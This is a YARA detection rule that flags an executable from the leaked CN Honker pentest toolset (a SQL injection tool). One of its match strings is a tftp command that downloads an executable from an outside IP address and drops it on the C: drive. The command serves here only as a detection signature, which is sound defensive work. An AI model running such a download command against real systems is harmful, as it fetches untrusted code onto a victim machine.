rule CN_Honker_D_injection_V2_32_RID30D8 : CHINA DEMO EXE FILE HKTL {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file D_injection_V2.32.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:57:11"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, EXE, FILE, HKTL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "Missing %s property(CommandText does not return a result set{Error creating obje" wide
      $s1 = "/tftp -i 219.134.46.245 get 9493.exe c:\\9394.exe" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and all of them
}